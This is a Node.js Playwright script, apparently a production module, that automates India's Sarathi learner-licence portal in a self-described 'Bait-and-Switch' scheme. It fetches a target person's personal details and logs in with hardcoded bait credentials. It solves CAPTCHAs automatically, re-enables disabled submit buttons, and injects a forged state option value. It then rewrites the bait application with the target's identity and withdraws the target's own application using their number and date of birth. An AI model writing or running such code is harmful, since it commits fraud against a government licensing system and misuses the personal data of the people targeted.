const { chromium } = require('playwright');
const path = require('path');
const fs = require('fs');
const CONFIG = require('../config/config');

const { solveSarathiCaptcha } = require('./sarathiCaptchaSolver');
const { fetchInfo } = require('./infoFetcherService');

async function smartSolveCaptcha(page) {
  console.log('[lledit] smartSolveCaptcha started');
  const rules = [
    { src: "#capimg1", tgt: "#entcaptxt1" },
    { src: "#capimg", tgt: "#entcaptxt" },
    { src: "#capimg", tgt: "input[placeholder*='Captcha']" },
    { src: "#capimg", tgt: "input[name*='captxt']" },
    { src: "#capimg", tgt: "#entCaptha" }
  ];

  for (const rule of rules) {
    const tgt = page.locator(rule.tgt).first();
    const src = page.locator(rule.src).first();
    if (await tgt.count() > 0) {
      try {
        await src.waitFor({ state: 'attached', timeout: 5000 });
        const imgBytes = await src.screenshot({ timeout: 5000 }).catch(() => null);
        if (!imgBytes) continue;
        const text = await solveSarathiCaptcha(imgBytes);
        if (text) {
          console.log('[lledit] Solved CAPTCHA:', text);
          await tgt.focus();
          await tgt.fill('');
          await page.waitForTimeout(200);
          await tgt.pressSequentially(text, { delay: 150 }); 
          return true;
        }
      } catch (e) {
        console.log('[lledit] Captcha rule failed:', rule.tgt, e.message);
      }
    }
  }
  return false;
}

async function robustSelect(page, selector, value, label, isStateInjection = false) {
    console.log('[lledit] Selecting', value, 'for', selector);
    const loc = page.locator(selector).first();
    try {
        await loc.waitFor({ state: 'attached', timeout: 10000 });
        
        if (isStateInjection) {
            console.log('[lledit] PERFORMING STATE INJECTION: Value MH for label Uttar Pradesh');
            await page.evaluate((sel) => {
                const el = document.querySelector(sel);
                const options = Array.from(el.options);
                const up = options.find(o => o.textContent.toLowerCase().includes('uttar pradesh'));
                if (up) {
                    up.value = 'MH';
                    el.dispatchEvent(new Event('change', { bubbles: true }));
                }
            }, selector);
            
            console.log('[lledit] Selecting "Select" then "Uttar Pradesh"');
            await loc.selectOption({ value: '-1' });
            await page.waitForTimeout(1000);
            await loc.selectOption({ label: 'Uttar Pradesh' });
        } else {
            console.log('[lledit] Setting value directly...');
            await loc.evaluate((el, val) => {
                el.value = val;
                el.dispatchEvent(new Event('change', { bubbles: true }));
            }, value);
        }

        console.log('[lledit] Waiting 4 seconds...');
        await page.waitForTimeout(4000);

        if (!isStateInjection && label) {
            console.log('[lledit] Selecting by label:', label);
            await loc.selectOption({ label: label }, { timeout: 5000 }).catch(() => {
                return loc.selectOption({ label: label.toUpperCase() }, { timeout: 3000 });
            }).catch(() => {});
        }
    } catch (e) {
        console.log('[lledit] Robust selection failed for', selector, '-', e.message);
    }
    await page.waitForTimeout(2000);
}

async function startLLEditFlow(targetAppNo, targetDob, mobile) {
  console.log(`🚀 [lledit] Starting Bait-and-Switch flow for ${targetAppNo}...`);
  
  // 1. Fetch Dynamic Target Details
  const dynamicData = await fetchInfo(targetAppNo, targetDob);
  if (!dynamicData || !dynamicData.NAME || !dynamicData.ADDRESS) {
    throw new Error(`Failed to fetch dynamic info for target application ${targetAppNo}.`);
  }
  console.log(`[lledit] Successfully fetched target info for ${dynamicData.NAME.first_name} ${dynamicData.NAME.last_name}`);

  // 2. Launch browser context
  const headless = CONFIG.PUPPETEER.HEADLESS === 'new' || CONFIG.PUPPETEER.HEADLESS === true;
  const browser = await chromium.launch({ headless });
  const context = await browser.newContext({
    userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
  });
  const page = await context.newPage();
  page.setDefaultTimeout(90000);
  page.setDefaultNavigationTimeout(90000);

  // 3. State selection and navigation
  console.log("[lledit] Navigating to stateSelection...");
  await page.goto('https://sarathi.parivahan.gov.in/sarathiservice/stateSelection.do');
  try { await page.getByLabel('Close').click({ timeout: 5000 }); } catch (e) {}
  
  await Promise.all([
    page.waitForNavigation(),
    page.locator('#stfNameId').selectOption('UP')
  ]);
  await page.waitForLoadState('domcontentloaded');

  try { 
    const closeBtn = page.locator('.close, button.close, .modal .btn-close, .modal button[data-dismiss="modal"]').first();
    if (await closeBtn.isVisible({timeout: 3000})) {
        await closeBtn.click();
    }
  } catch (e) {}

  const llLink = page.locator('text=/Learner Licence/i').first();
  await llLink.waitFor({ state: 'visible', timeout: 30000 });
  await llLink.click({ force: true });
  
  const appEditLink = page.locator('text=/Application Edit/i').first();
  await appEditLink.waitFor({ state: 'attached', timeout: 30000 });
  await appEditLink.evaluate(node => node.click());

  // --- Stage 1: Initial Login (Bait Credentials) ---
  const baitAppNo = '2081829326';
  const baitDob = '01-01-2001';
  console.log("[lledit] Filling bait credentials...");
  await page.getByRole('textbox', { name: 'Application Number' }).fill(baitAppNo);
  await page.getByRole('textbox', { name: 'Application Number' }).press('Tab');
  await page.getByRole('textbox', { name: 'Enter Date of Birth in dd-MM-' }).fill(baitDob);

  let stage1Success = false;
  let retries1 = 0;
  while (!stage1Success && retries1 < 10) {
    retries1++;
    await smartSolveCaptcha(page);
    
    const loginSubmitBtn = page.locator('#submit, input[value="Submit"], button:has-text("Submit")').first();
    await loginSubmitBtn.waitFor({ state: 'attached', timeout: 5000 }).catch(() => {});
    await loginSubmitBtn.evaluate(el => el.disabled = false); 
    await loginSubmitBtn.click();

    try {
      await page.getByRole('button', { name: 'Confirm' }).waitFor({ state: 'visible', timeout: 5000 });
      stage1Success = true;
    } catch (e) {
      console.log(`[lledit] Stage 1 login failed, retry ${retries1}/10...`);
      try { await page.locator('#caprefresh, .refresh-img').first().click({ timeout: 2000 }); } catch(err) {}
    }
  }

  if (!stage1Success) {
    await browser.close().catch(() => {});
    throw new Error("Failed to pass stage 1 captcha login after 10 attempts.");
  }

  // --- Stage 2: Confirmation & OTP Generation ---
  console.log("[lledit] Proceeding to Confirmation...");
  const confirmBtn = page.locator('#confirm, input[value="Confirm"], button:has-text("Confirm"), .btn:has-text("Confirm")').first();
  await confirmBtn.waitFor({ state: 'attached', timeout: 5000 });
  await confirmBtn.evaluate(el => el.disabled = false); 
  await confirmBtn.click();
  console.log('[lledit] Clicked Confirm button, waiting 3 seconds...');
  await page.waitForTimeout(3000);

  let stage2Success = false;
  let retries2 = 0;
  while (!stage2Success && retries2 < 10) {
    retries2++;
    await smartSolveCaptcha(page);
    
    console.log('[lledit] Checking if OTP input is already present...');
    const otpInput = page.locator('#otp, #otpSarathi, [name*="otp"], [title*="OTP"]').first();
    if (await otpInput.isVisible()) {
        console.log('[lledit] OTP input detected! Skipping Generate OTP button.');
        stage2Success = true;
        break;
    }

    console.log('[lledit] Looking for Generate OTP button...');
    const genBtn = page.locator('#generateOtp, button:has-text("Generate OTP"), input[value="Generate OTP"]').first();
    if (await genBtn.count() > 0) {
        await genBtn.click();
        await page.waitForTimeout(2000);
    }

    try {
      await page.locator('#otpNumberSarathi, #otp').first().waitFor({ state: 'visible', timeout: 5000 });
      stage2Success = true;
    } catch (e) {
      console.log(`[lledit] Stage 2 failed, retry ${retries2}/10...`);
      try { await page.locator('#caprefresh, .refresh-img').first().click({ timeout: 2000 }); } catch(err) {}
    }
  }

  if (!stage2Success) {
    await browser.close().catch(() => {});
    throw new Error("Failed to generate OTP after 10 attempts.");
  }

  console.log("[lledit] Generate OTP step complete. Session paused, waiting for user input.");
  return { browser, context, page, dynamicData };
}

async function submitLLEditOTP(context, page, otpCode, targetAppNo, targetDob, dynamicData) {
  try {
    console.log('[lledit] Submitting OTP...');
    const otpInput = page.locator('#otp, #otpSarathi, [name*="otp"], [title*="OTP"], #otpNumberSarathi').first();
    await otpInput.waitFor({ state: 'attached', timeout: 10000 });
    await otpInput.focus();
    await otpInput.fill(otpCode);

    await smartSolveCaptcha(page);
    await page.locator('#otpCheckbox').check().catch(() => {});
    
    const verifyBtn = page.locator('#verifySarathi, button:has-text("Submit OTP"), input[value="Submit OTP"]').first();
    await verifyBtn.evaluate(el => el.disabled = false); 
    await verifyBtn.click();

    console.log('[lledit] Submitted OTP. Waiting for dynamic form...');
    await page.locator('#fname').waitFor({ state: 'visible', timeout: 45000 });

    // --- Dynamic Form Filling ---
    console.log('[lledit] Form reached. Filling dynamic target data...');
    const fetchedData = dynamicData;
    const addrKeys = Object.keys(fetchedData.ADDRESS || {}).filter(k => k.startsWith('address'));
    const addressLine1 = fetchedData.ADDRESS.address1 || '';
    const addressLine2 = addrKeys.slice(1).map(k => fetchedData.ADDRESS[k]).filter(Boolean).join(' ') || fetchedData.ADDRESS.address2 || '';

    const dyn = {
        fname: fetchedData.NAME.first_name || '',
        mname: fetchedData.NAME.middle_name || '',
        lname: fetchedData.NAME.last_name || '',
        ffname: fetchedData["FATHER NAME"].first_name || '',
        fmname: fetchedData["FATHER NAME"].middle_name || '',
        flname: fetchedData["FATHER NAME"].last_name || '',
        bg: "O+",
        addressLine1,
        addressLine2,
        pincode: fetchedData.ADDRESS.pin_code || '',
        fullAddress: Object.values(fetchedData.ADDRESS || {}).join(' '),
        covs: ["LMV"]
    };

    const fillField = async (sel, val) => {
        console.log('[lledit] Type/Fill', sel, 'with', val);
        const loc = page.locator(sel).first();
        await loc.waitFor({ state: 'attached', timeout: 10000 });
        await loc.focus();
        await loc.fill('');
        await loc.pressSequentially(val, { delay: 100 }); 
        await page.waitForTimeout(500);
    };

    await fillField('#fname', dyn.fname);
    await fillField('#mname', dyn.mname);
    await fillField('#lname', dyn.lname);
    await fillField('#swdfName', dyn.ffname);
    await fillField('#swdmName', dyn.fmname);
    await fillField('#swdlName', dyn.flname);
    
    await robustSelect(page, '#bloodGroup', dyn.bg);
    await robustSelect(page, '#presState', 'MH', 'Uttar Pradesh', true);

    console.log('[lledit] Matching District for address:', dyn.fullAddress);
    const districtOptions = await page.locator('#presDistrict option').evaluateAll(options => options.map(o => ({ value: o.value, text: o.textContent.trim() })));
    let selectedDist = districtOptions.find(o => dyn.fullAddress.toLowerCase().includes(o.text.toLowerCase()));
    if (!selectedDist && dyn.fullAddress.toLowerCase().includes('mumbai')) {
        selectedDist = districtOptions.find(o => o.text.toLowerCase().includes('mumbai suburban')) || districtOptions.find(o => o.text.toLowerCase().includes('mumbai'));
    }
    if (!selectedDist && dyn.pincode) {
        try {
            console.log('[lledit] Fetching district info for pincode:', dyn.pincode);
            const axios = require('axios');
            const pinRes = await axios.get(`https://api.postalpincode.in/pincode/${dyn.pincode}`, { timeout: 5000 });
            if (pinRes.data && pinRes.data[0] && pinRes.data[0].Status === 'Success' && pinRes.data[0].PostOffice) {
                const po = pinRes.data[0].PostOffice[0];
                const cleanDistrictName = (po.District || '').replace(/\(.*\)/g, '').trim().toLowerCase();
                const cleanDivisionName = (po.Division || '').trim().toLowerCase();
                selectedDist = districtOptions.find(o => {
                    const optText = o.text.toLowerCase();
                    return optText.includes(cleanDistrictName) || optText.includes(cleanDivisionName) || cleanDistrictName.includes(optText) || cleanDivisionName.includes(optText);
                });
            }
        } catch (err) {
            console.log('[lledit] Pincode API lookup failed:', err.message);
        }
    }
    if (selectedDist) {
        console.log('[lledit] Found District Match:', selectedDist.text);
        await robustSelect(page, '#presDistrict', selectedDist.value, selectedDist.text);
    } else {
        await robustSelect(page, '#presDistrict', '518'); 
    }

    const subdistOptions = await page.locator('#presSubDistrict option').evaluateAll(options => options.map(o => o.value));
    const validSub = subdistOptions.find(v => v !== '-1');
    if (validSub) await robustSelect(page, '#presSubDistrict', validSub);

    await page.locator('#presSameAsPerm').check().catch(() => {});
    await page.waitForTimeout(1000);
    await fillField('#presHouseNo', dyn.addressLine1);
    await fillField('#presStreet', dyn.addressLine2);
    await fillField('#presPinCode', dyn.pincode);

    console.log('[lledit] Adding COVs:', dyn.covs);
    const covMap = {
        "MCWG": "Motor Cycle with Gear(Non Transport) (MCWG)",
        "LMV": "LIGHT MOTOR VEHICLE (LMV)",
        "LMV-TR": "LMV-TR(GOODS) (LMV-TR)",
        "3W-CAB": "LMV -3 Wheeler CAB (3W-CAB)",
        "3W-GV": "LMV -3 Wheeler Transport Goods Non PSV (3W-GV)",
        "MCWOG": "Motor cycle without Gear (Non Transport) (MCWOG)"
    };
    for (const covCode of dyn.covs) {
        const fullLabel = covMap[covCode] || covCode;
        const optVal = await page.locator('#covsList option').evaluateAll((options, label) => {
            const o = options.find(o => o.textContent.toLowerCase().includes(label.toLowerCase()));
            if (o) { o.selected = true; return o.value; }
            return null;
        }, fullLabel);
        if (optVal) {
            await page.locator('#covsList').dispatchEvent('change');
            await page.locator('#button_add').first().click();
        }
    }

    await page.locator('input[name="willingToDonatee"][value="2"]').check().catch(() => {});
    await page.locator('#accepted').check().catch(() => {});
    await page.waitForTimeout(1000);
    
    console.log('[lledit] Solving final captcha...');
    await smartSolveCaptcha(page);

    page.on('dialog', async dialog => {
        console.log('[lledit] Dialog appeared:', dialog.message());
        await dialog.accept().catch(() => {});
    });

    const finalConfirmBtn = page.locator('#submitOtp, #confirm, input[value="Confirm"], button:has-text("Confirm"), .btn:has-text("Confirm")').first();
    await finalConfirmBtn.waitFor({ state: 'attached', timeout: 5000 });
    console.log('[lledit] Submitting final form via multiple clicking techniques...');
    try {
        await finalConfirmBtn.evaluate(el => { 
            el.disabled = false; 
            el.click(); 
        });
    } catch (e) {}
    await page.waitForTimeout(1000);
    try {
        await finalConfirmBtn.click({ force: true, timeout: 3000 });
    } catch (e) {}
    await page.waitForTimeout(1000);
    try {
        await finalConfirmBtn.evaluate(el => {
            el.dispatchEvent(new MouseEvent('click', { bubbles: true, cancelable: true }));
        });
    } catch (e) {}

    console.log('[lledit] Final submit clicked! Waiting for success message "Application Updated Successfully"...');
    const successLocator = page.locator('text=/updated successfully|successfully|updated/i').first();
    await successLocator.waitFor({ state: 'visible', timeout: 30000 }).catch(() => {
        console.log('[lledit] Success message not found within 30s, continuing with priming requests...');
    });

    // --- Withdraw Service Flow in New Tab ---
    console.log('[lledit] Opening new tab for Service Withdraw...');
    const page1 = await context.newPage();
    
    // Dialog handler for the new tab to accept the withdraw confirmation popup
    page1.on('dialog', async dialog => {
      console.log('[lledit] [Withdraw Tab] Dialog appeared:', dialog.message());
      await dialog.accept().catch(() => {});
    });

    console.log('[lledit] Navigating new tab to home page...');
    await page1.goto('https://sarathi.parivahan.gov.in/sarathiservice/sarathiHomePublic.do');
    
    console.log('[lledit] Clicking Service Withdraw Service...');
    await page1.getByRole('link', { name: 'Service Withdraw Service' }).click();

    console.log('[lledit] Filling target credentials for withdrawal:', targetAppNo);
    const withdrawAppInput = page1.getByRole('textbox', { name: 'Application Number' });
    await withdrawAppInput.waitFor({ state: 'visible', timeout: 30000 });
    await withdrawAppInput.fill(targetAppNo);
    await page1.getByRole('textbox', { name: 'Enter Date of Birth in dd-MM-' }).fill(targetDob);

    let withdrawLoginSuccess = false;
    let withdrawRetries = 0;
    while (!withdrawLoginSuccess && withdrawRetries < 10) {
      withdrawRetries++;
      await smartSolveCaptcha(page1);
      
      const submitBtn = page1.getByRole('button', { name: 'Submit' }).first();
      await submitBtn.click();
      
      try {
        const confirmBtn = page1.getByRole('button', { name: 'Confirm' }).first();
        await confirmBtn.waitFor({ state: 'visible', timeout: 8000 });
        withdrawLoginSuccess = true;
      } catch (e) {
        console.log(`[lledit] Withdraw login/submit failed, retry ${withdrawRetries}/10...`);
        try { await page1.locator('#caprefresh, .refresh-img').first().click({ timeout: 2000 }); } catch (err) {}
      }
    }

    if (!withdrawLoginSuccess) {
      throw new Error("Failed to pass captcha on Service Withdraw page after 10 attempts.");
    }

    console.log('[lledit] Clicking Confirm on withdraw page...');
    const finalConfirmWithdrawBtn = page1.getByRole('button', { name: 'Confirm' }).first();
    await finalConfirmWithdrawBtn.click();
    await page1.waitForTimeout(3000);

    console.log('[lledit] Navigating to home page for DL Search...');
    await page1.goto('https://sarathi.parivahan.gov.in/sarathiservice/sarathiHomePublic.do');
    
    console.log('[lledit] Clicking DL Search...');
    await page1.getByRole('link', { name: 'DL Search' }).first().click();
    await page1.waitForTimeout(4000);

    console.log('[lledit] Going back to main page and reloading...');
    await page.bringToFront();
    await page.reload();
    console.log('[lledit] Bait-and-Switch flow complete successfully with withdrawal!');
  } finally {
    await page.waitForTimeout(3000);
    await context.close().catch(() => {});
  }
}

module.exports = {
  startLLEditFlow,
  submitLLEditOTP
};
